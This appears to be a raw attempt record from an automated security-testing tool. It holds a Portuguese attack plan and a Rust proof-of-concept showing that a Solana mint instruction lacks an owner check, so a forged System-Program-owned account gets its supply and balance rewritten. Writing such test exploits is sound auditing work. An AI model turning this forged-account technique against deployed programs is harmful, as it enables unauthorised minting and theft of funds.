attempts.raw:
{
  "plan": "O ataque explora a ausência de verificação de owner na instrução mint (Pinocchio). O baseline usa uma conta ledger legítima com owner = program_id e dados válidos, provando que o cenário está montado corretamente. O ataque fornece uma conta forjada com owner diferente (ex.: System Program) e dados forjados nos offsets 40..56. O efeito mede que a conta forjada teve seus dados alterados (supply e balance incrementados), demonstrando que o programa escreveu em uma conta que não lhe pertence.",
  "scenario": "let program_id = env.program_id;

// Conta ledger legítima: owner = program_id, dados com supply=100, balance=200 nos offsets 40..56
let mut ledger_data = vec![0u8; 56];
ledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());
ledger_data[48..56].copy_from_slice(&200u64.to_le_bytes());
let ledger_legit = account(&program_id, &ledger_data, None);

// Conta forjada: owner = System Program (diferente do program_id), mesmos dados iniciais
let system_program_id = solana_sdk::system_program::id();
let mut forged_data = vec![0u8; 56];
forged_data[40..48].copy_from_slice(&100u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&200u64.to_le_bytes());
let ledger_forged = account(&system_program_id, &forged_data, None);

// Instrução mint: IX_MINT = 2, amount = 50
let mut ix_data = vec![2u8];
ix_data.extend_from_slice(&50u64.to_le_bytes());
let metas = vec![AccountMeta::new(program_id, false)];
let ix = env.raw_ix(&ix_data, metas);

// Baseline: usa a conta legítima (owner = program_id)
let baseline_accounts = vec![(program_id, ledger_legit.clone())];
let baseline_result = env.baseline("mint legítimo", &ix, &baseline_accounts);

// Ataque: usa a conta forjada (owner = System Program)
let attack_accounts = vec![(program_id, ledger_forged.clone())];
let attack_result = env.attack("mint com conta forjada", &ix, &attack_accounts);

// Efeito: se o ataque teve sucesso, a conta forjada deve ter sido modificada
if attack_result.program_result == ProgramResult::Success {
    let forged_after = after(&attack_result, &program_id);
    let supply_after = read_u64(forged_after.data(), 40);
    let balance_after = read_u64(forged_after.data(), 48);
    env.effect("supply da conta forjada incrementado", supply_after == 150);
    env.effect("balance da conta forjada incrementado", balance_after == 250);
}"
}

